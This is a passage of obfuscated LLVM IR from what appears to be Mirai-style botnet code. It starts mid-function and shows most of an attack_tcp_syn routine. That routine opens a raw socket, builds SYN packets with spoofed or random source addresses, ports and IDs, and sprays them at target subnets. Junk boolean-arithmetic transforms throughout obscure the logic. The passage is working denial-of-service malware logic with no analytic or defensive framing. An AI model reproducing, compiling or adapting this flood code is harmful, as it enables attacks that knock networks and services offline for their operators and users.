  %580 = add i64 %579, -4136356637899774428
  %581 = add i64 66, %577
  %582 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %583 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %584 = load i32, i32* %11, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i64 %585
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %586, i32 0, i32 0
  %588 = bitcast %struct.sockaddr_in* %587 to %struct.sockaddr*
  store %struct.sockaddr* %588, %struct.sockaddr** %582, align 8
  %589 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %590 = load %struct.sockaddr*, %struct.sockaddr** %589, align 8
  %591 = call i64 @sendto(i32 %574, i8* %575, i64 %580, i32 16384, %struct.sockaddr* %590, i32 16)
  br label %592

; <label>:592:                                    ; preds = %519
  %593 = load i32, i32* %11, align 4
  %594 = sub i32 0, %593
  %595 = sub i32 0, 1
  %596 = add i32 %594, %595
  %597 = sub i32 0, %596
  %598 = add nsw i32 %593, 1
  store i32 %597, i32* %11, align 4
  br label %343

; <label>:599:                                    ; preds = %343
  %600 = call i64 @time(i64* null) #6
  %601 = load i32, i32* %24, align 4
  %602 = sext i32 %601 to i64
  %603 = icmp sgt i64 %600, %602
  br i1 %603, label %604, label %605

; <label>:604:                                    ; preds = %599
  br label %606

; <label>:605:                                    ; preds = %599
  br label %342

; <label>:606:                                    ; preds = %604, %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = sub i64 0, %99
  %103 = sub i64 0, %101
  %104 = add i64 %102, %103
  %105 = sub i64 0, %104
  %106 = add nsw i64 %99, %101
  %107 = trunc i64 %105 to i32
  store i32 %107, i32* %29, align 4
  %108 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %108, i32* %12, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %5
  br label %669

; <label>:111:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %112 = load i32, i32* %12, align 4
  %113 = bitcast i32* %11 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* %12, align 4
  %118 = call i32 @close(i32 %117)
  br label %669

; <label>:119:                                    ; preds = %111
  store i32 0, i32* %11, align 4
  br label %120

; <label>:120:                                    ; preds = %479, %119
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %485

; <label>:125:                                    ; preds = %120
  %126 = call noalias i8* @calloc(i64 128, i64 1) #6
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %13, align 8
  %132 = load i32, i32* %11, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %30, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.tcphdr*
  store %struct.tcphdr* %139, %struct.tcphdr** %31, align 8
  %140 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i64 1
  %142 = bitcast %struct.tcphdr* %141 to i8*
  store i8* %142, i8** %32, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = xor i8 %145, -1
  %147 = xor i8 15, -1
  %148 = xor i8 -10, -1
  %149 = or i8 %146, %147
  %150 = or i8 -10, %148
  %151 = xor i8 %149, -1
  %152 = and i8 %151, %150
  %153 = and i8 %145, 15
  %154 = xor i8 %152, -1
  %155 = xor i8 64, -1
  %156 = xor i8 -114, -1
  %157 = and i8 %154, -114
  %158 = and i8 %152, %156
  %159 = and i8 %155, -114
  %160 = and i8 64, %156
  %161 = or i8 %157, %158
  %162 = or i8 %159, %160
  %163 = xor i8 %161, %162
  %164 = or i8 %154, %155
  %165 = xor i8 %164, -1
  %166 = or i8 -114, %156
  %167 = and i8 %165, %166
  %168 = or i8 %163, %167
  %169 = or i8 %152, 64
  store i8 %168, i8* %144, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = xor i8 %172, -1
  %174 = xor i8 -16, -1
  %175 = xor i8 -77, -1
  %176 = or i8 %173, %174
  %177 = or i8 -77, %175
  %178 = xor i8 %176, -1
  %179 = and i8 %178, %177
  %180 = and i8 %172, -16
  %181 = xor i8 %179, -1
  %182 = xor i8 5, -1
  %183 = xor i8 2, -1
  %184 = and i8 %181, 2
  %185 = and i8 %179, %183
  %186 = and i8 %182, 2
  %187 = and i8 5, %183
  %188 = or i8 %184, %185
  %189 = or i8 %186, %187
  %190 = xor i8 %188, %189
  %191 = or i8 %181, %182
  %192 = xor i8 %191, -1
  %193 = or i8 2, %183
  %194 = and i8 %192, %193
  %195 = or i8 %190, %194
  %196 = or i8 %179, 5
  store i8 %195, i8* %171, align 4
  %197 = load i8, i8* %14, align 1
  %198 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 1
  store i8 %197, i8* %199, align 1
  %200 = call zeroext i16 @htons(i16 zeroext 60) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  %203 = load i16, i16* %15, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %16, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %17, align 1
  %211 = icmp ne i8 %210, 0
  br i1 %211, label %212, label %216

; <label>:212:                                    ; preds = %125
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %125
  %217 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 6
  store i8 6, i8* %218, align 1
  %219 = load i32, i32* %28, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 8
  store i32 %219, i32* %221, align 4
  %222 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %223 = load i32, i32* %11, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 1
  %227 = load i32, i32* %226, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 9
  store i32 %227, i32* %229, align 4
  %230 = load i16, i16* %18, align 2
  %231 = call zeroext i16 @htons(i16 zeroext %230) #7
  %232 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  store i16 %231, i16* %233, align 4
  %234 = load i16, i16* %19, align 2
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 1
  store i16 %235, i16* %237, align 2
  %238 = load i32, i32* %20, align 4
  %239 = trunc i32 %238 to i16
  %240 = call zeroext i16 @htons(i16 zeroext %239) #7
  %241 = zext i16 %240 to i32
  %242 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 2
  store i32 %241, i32* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = xor i16 -241, -1
  %248 = xor i16 %246, %247
  %249 = and i16 %248, %246
  %250 = and i16 %246, -241
  %251 = xor i16 %249, -1
  %252 = xor i16 160, -1
  %253 = xor i16 -14625, -1
  %254 = and i16 %251, -14625
  %255 = and i16 %249, %253
  %256 = and i16 %252, -14625
  %257 = and i16 160, %253
  %258 = or i16 %254, %255
  %259 = or i16 %256, %257
  %260 = xor i16 %258, %259
  %261 = or i16 %251, %252
  %262 = xor i16 %261, -1
  %263 = or i16 -14625, %253
  %264 = and i16 %262, %263
  %265 = or i16 %260, %264
  %266 = or i16 %249, 160
  store i16 %265, i16* %245, align 4
  %267 = load i8, i8* %22, align 1
  %268 = sext i8 %267 to i16
  %269 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = xor i16 %268, -1
  %273 = xor i16 1, -1
  %274 = xor i16 -8133, -1
  %275 = or i16 %272, %273
  %276 = or i16 -8133, %274
  %277 = xor i16 %275, -1
  %278 = and i16 %277, %276
  %279 = and i16 %268, 1
  %280 = shl i16 %278, 13
  %281 = xor i16 -8193, -1
  %282 = xor i16 %271, %281
  %283 = and i16 %282, %271
  %284 = and i16 %271, -8193
  %285 = xor i16 %283, -1
  %286 = xor i16 %280, -1
  %287 = xor i16 -32431, -1
  %288 = and i16 %285, -32431
  %289 = and i16 %283, %287
  %290 = and i16 %286, -32431
  %291 = and i16 %280, %287
  %292 = or i16 %288, %289
  %293 = or i16 %290, %291
  %294 = xor i16 %292, %293
  %295 = or i16 %285, %286
  %296 = xor i16 %295, -1
  %297 = or i16 -32431, %287
  %298 = and i16 %296, %297
  %299 = or i16 %294, %298
  %300 = or i16 %283, %280
  store i16 %299, i16* %270, align 4
  %301 = load i8, i8* %23, align 1
  %302 = sext i8 %301 to i16
  %303 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 4
  %305 = load i16, i16* %304, align 4
  %306 = xor i16 1, -1
  %307 = xor i16 %302, %306
  %308 = and i16 %307, %302
  %309 = and i16 %302, 1
  %310 = shl i16 %308, 12
  %311 = xor i16 %305, -1
  %312 = xor i16 -4097, -1
  %313 = xor i16 25671, -1
  %314 = or i16 %311, %312
  %315 = or i16 25671, %313
  %316 = xor i16 %314, -1
  %317 = and i16 %316, %315
  %318 = and i16 %305, -4097
  %319 = and i16 %317, %310
  %320 = xor i16 %317, %310
  %321 = or i16 %319, %320
  %322 = or i16 %317, %310
  store i16 %321, i16* %304, align 4
  %323 = load i8, i8* %24, align 1
  %324 = sext i8 %323 to i16
  %325 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = xor i16 %324, -1
  %329 = xor i16 1, -1
  %330 = xor i16 -23663, -1
  %331 = or i16 %328, %329
  %332 = or i16 -23663, %330
  %333 = xor i16 %331, -1
  %334 = and i16 %333, %332
  %335 = and i16 %324, 1
  %336 = shl i16 %334, 11
  %337 = xor i16 -2049, -1
  %338 = xor i16 %327, %337
  %339 = and i16 %338, %327
  %340 = and i16 %327, -2049
  %341 = xor i16 %339, -1
  %342 = xor i16 %336, -1
  %343 = xor i16 22032, -1
  %344 = and i16 %341, 22032
  %345 = and i16 %339, %343
  %346 = and i16 %342, 22032
  %347 = and i16 %336, %343
  %348 = or i16 %344, %345
  %349 = or i16 %346, %347
  %350 = xor i16 %348, %349
  %351 = or i16 %341, %342
  %352 = xor i16 %351, -1
  %353 = or i16 22032, %343
  %354 = and i16 %352, %353
  %355 = or i16 %350, %354
  %356 = or i16 %339, %336
  store i16 %355, i16* %326, align 4
  %357 = load i8, i8* %25, align 1
  %358 = sext i8 %357 to i16
  %359 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %360 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %359, i32 0, i32 4
  %361 = load i16, i16* %360, align 4
  %362 = xor i16 1, -1
  %363 = xor i16 %358, %362
  %364 = and i16 %363, %358
  %365 = and i16 %358, 1
  %366 = shl i16 %364, 10
  %367 = xor i16 -1025, -1
  %368 = xor i16 %361, %367
  %369 = and i16 %368, %361
  %370 = and i16 %361, -1025
  %371 = and i16 %369, %366
  %372 = xor i16 %369, %366
  %373 = or i16 %371, %372
  %374 = or i16 %369, %366
  store i16 %373, i16* %360, align 4
  %375 = load i8, i8* %26, align 1
  %376 = sext i8 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 4
  %379 = load i16, i16* %378, align 4
  %380 = xor i16 %376, -1
  %381 = xor i16 1, -1
  %382 = xor i16 7654, -1
  %383 = or i16 %380, %381
  %384 = or i16 7654, %382
  %385 = xor i16 %383, -1
  %386 = and i16 %385, %384
  %387 = and i16 %376, 1
  %388 = shl i16 %386, 9
  %389 = xor i16 %379, -1
  %390 = xor i16 -513, -1
  %391 = xor i16 -31733, -1
  %392 = or i16 %389, %390
  %393 = or i16 -31733, %391
  %394 = xor i16 %392, -1
  %395 = and i16 %394, %393
  %396 = and i16 %379, -513
  %397 = and i16 %395, %388
  %398 = xor i16 %395, %388
  %399 = or i16 %397, %398
  %400 = or i16 %395, %388
  store i16 %399, i16* %378, align 4
  %401 = load i8, i8* %27, align 1
  %402 = sext i8 %401 to i16
  %403 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 4
  %405 = load i16, i16* %404, align 4
  %406 = xor i16 1, -1
  %407 = xor i16 %402, %406
  %408 = and i16 %407, %402
  %409 = and i16 %402, 1
  %410 = shl i16 %408, 8
  %411 = xor i16 %405, -1
  %412 = xor i16 -257, -1
  %413 = xor i16 -30309, -1
  %414 = or i16 %411, %412
  %415 = or i16 -30309, %413
  %416 = xor i16 %414, -1
  %417 = and i16 %416, %415
  %418 = and i16 %405, -257
  %419 = xor i16 %417, -1
  %420 = xor i16 %410, -1
  %421 = xor i16 14521, -1
  %422 = and i16 %419, 14521
  %423 = and i16 %417, %421
  %424 = and i16 %420, 14521
  %425 = and i16 %410, %421
  %426 = or i16 %422, %423
  %427 = or i16 %424, %425
  %428 = xor i16 %426, %427
  %429 = or i16 %419, %420
  %430 = xor i16 %429, -1
  %431 = or i16 14521, %421
  %432 = and i16 %430, %431
  %433 = or i16 %428, %432
  %434 = or i16 %417, %410
  store i16 %433, i16* %404, align 4
  %435 = load i8*, i8** %32, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %32, align 8
  store i8 2, i8* %435, align 1
  %437 = load i8*, i8** %32, align 8
  %438 = getelementptr inbounds i8, i8* %437, i32 1
  store i8* %438, i8** %32, align 8
  store i8 4, i8* %437, align 1
  %439 = call i32 @rand_next()
  %440 = xor i32 15, -1
  %441 = xor i32 %439, %440
  %442 = and i32 %441, %439
  %443 = and i32 %439, 15
  %444 = sub i32 1400, 691003471
  %445 = add i32 %444, %442
  %446 = add i32 %445, 691003471
  %447 = add i32 1400, %442
  %448 = trunc i32 %446 to i16
  %449 = call zeroext i16 @htons(i16 zeroext %448) #7
  %450 = load i8*, i8** %32, align 8
  %451 = bitcast i8* %450 to i16*
  store i16 %449, i16* %451, align 2
  %452 = load i8*, i8** %32, align 8
  %453 = getelementptr inbounds i8, i8* %452, i64 2
  store i8* %453, i8** %32, align 8
  %454 = load i8*, i8** %32, align 8
  %455 = getelementptr inbounds i8, i8* %454, i32 1
  store i8* %455, i8** %32, align 8
  store i8 4, i8* %454, align 1
  %456 = load i8*, i8** %32, align 8
  %457 = getelementptr inbounds i8, i8* %456, i32 1
  store i8* %457, i8** %32, align 8
  store i8 2, i8* %456, align 1
  %458 = load i8*, i8** %32, align 8
  %459 = getelementptr inbounds i8, i8* %458, i32 1
  store i8* %459, i8** %32, align 8
  store i8 8, i8* %458, align 1
  %460 = load i8*, i8** %32, align 8
  %461 = getelementptr inbounds i8, i8* %460, i32 1
  store i8* %461, i8** %32, align 8
  store i8 10, i8* %460, align 1
  %462 = call i32 @rand_next()
  %463 = load i8*, i8** %32, align 8
  %464 = bitcast i8* %463 to i32*
  store i32 %462, i32* %464, align 4
  %465 = load i8*, i8** %32, align 8
  %466 = getelementptr inbounds i8, i8* %465, i64 4
  store i8* %466, i8** %32, align 8
  %467 = load i8*, i8** %32, align 8
  %468 = bitcast i8* %467 to i32*
  store i32 0, i32* %468, align 4
  %469 = load i8*, i8** %32, align 8
  %470 = getelementptr inbounds i8, i8* %469, i64 4
  store i8* %470, i8** %32, align 8
  %471 = load i8*, i8** %32, align 8
  %472 = getelementptr inbounds i8, i8* %471, i32 1
  store i8* %472, i8** %32, align 8
  store i8 1, i8* %471, align 1
  %473 = load i8*, i8** %32, align 8
  %474 = getelementptr inbounds i8, i8* %473, i32 1
  store i8* %474, i8** %32, align 8
  store i8 3, i8* %473, align 1
  %475 = load i8*, i8** %32, align 8
  %476 = getelementptr inbounds i8, i8* %475, i32 1
  store i8* %476, i8** %32, align 8
  store i8 3, i8* %475, align 1
  %477 = load i8*, i8** %32, align 8
  %478 = getelementptr inbounds i8, i8* %477, i32 1
  store i8* %478, i8** %32, align 8
  store i8 6, i8* %477, align 1
  br label %479

; <label>:479:                                    ; preds = %216
  %480 = load i32, i32* %11, align 4
  %481 = sub i32 %480, 1584430578
  %482 = add i32 %481, 1
  %483 = add i32 %482, 1584430578
  %484 = add nsw i32 %480, 1
  store i32 %483, i32* %11, align 4
  br label %120

; <label>:485:                                    ; preds = %120
  br label %486

; <label>:486:                                    ; preds = %668, %485
  store i32 0, i32* %11, align 4
  br label %487

; <label>:487:                                    ; preds = %657, %486
  %488 = load i32, i32* %11, align 4
  %489 = load i8, i8* %7, align 1
  %490 = zext i8 %489 to i32
  %491 = icmp slt i32 %488, %490
  br i1 %491, label %492, label %662

; <label>:492:                                    ; preds = %487
  %493 = load i8**, i8*** %13, align 8
  %494 = load i32, i32* %11, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds i8*, i8** %493, i64 %495
  %497 = load i8*, i8** %496, align 8
  store i8* %497, i8** %33, align 8
  %498 = load i8*, i8** %33, align 8
  %499 = bitcast i8* %498 to %struct.iphdr*
  store %struct.iphdr* %499, %struct.iphdr** %34, align 8
  %500 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i64 1
  %502 = bitcast %struct.iphdr* %501 to %struct.tcphdr*
  store %struct.tcphdr* %502, %struct.tcphdr** %35, align 8
  %503 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %504 = load i32, i32* %11, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %503, i64 %505
  %507 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %506, i32 0, i32 2
  %508 = load i8, i8* %507, align 4
  %509 = zext i8 %508 to i32
  %510 = icmp slt i32 %509, 32
  br i1 %510, label %511, label %535

; <label>:511:                                    ; preds = %492
  %512 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %513 = load i32, i32* %11, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i32 0, i32 1
  %517 = load i32, i32* %516, align 4
  %518 = call i32 @ntohl(i32 %517) #7
  %519 = call i32 @rand_next()
  %520 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %521 = load i32, i32* %11, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i32 0, i32 2
  %525 = load i8, i8* %524, align 4
  %526 = zext i8 %525 to i32
  %527 = lshr i32 %519, %526
  %528 = add i32 %518, 737600068
  %529 = add i32 %528, %527
  %530 = sub i32 %529, 737600068
  %531 = add i32 %518, %527
  %532 = call i32 @htonl(i32 %530) #7
  %533 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 9
  store i32 %532, i32* %534, align 4
  br label %535

; <label>:535:                                    ; preds = %511, %492
  %536 = load i32, i32* %28, align 4
  %537 = icmp eq i32 %536, -1
  br i1 %537, label %538, label %542

; <label>:538:                                    ; preds = %535
  %539 = call i32 @rand_next()
  %540 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 8
  store i32 %539, i32* %541, align 4
  br label %542

; <label>:542:                                    ; preds = %538, %535
  %543 = load i16, i16* %15, align 2
  %544 = zext i16 %543 to i32
  %545 = icmp eq i32 %544, 65535
  br i1 %545, label %546, label %559

; <label>:546:                                    ; preds = %542
  %547 = call i32 @rand_next()
  %548 = xor i32 %547, -1
  %549 = xor i32 65535, -1
  %550 = xor i32 -987798374, -1
  %551 = or i32 %548, %549
  %552 = or i32 -987798374, %550
  %553 = xor i32 %551, -1
  %554 = and i32 %553, %552
  %555 = and i32 %547, 65535
  %556 = trunc i32 %554 to i16
  %557 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %558 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %557, i32 0, i32 3
  store i16 %556, i16* %558, align 4
  br label %559

; <label>:559:                                    ; preds = %546, %542
  %560 = load i16, i16* %18, align 2
  %561 = zext i16 %560 to i32
  %562 = icmp eq i32 %561, 65535
  br i1 %562, label %563, label %572

; <label>:563:                                    ; preds = %559
  %564 = call i32 @rand_next()
  %565 = xor i32 65535, -1
  %566 = xor i32 %564, %565
  %567 = and i32 %566, %564
  %568 = and i32 %564, 65535
  %569 = trunc i32 %567 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 0
  store i16 %569, i16* %571, align 4
  br label %572

; <label>:572:                                    ; preds = %563, %559
  %573 = load i16, i16* %19, align 2
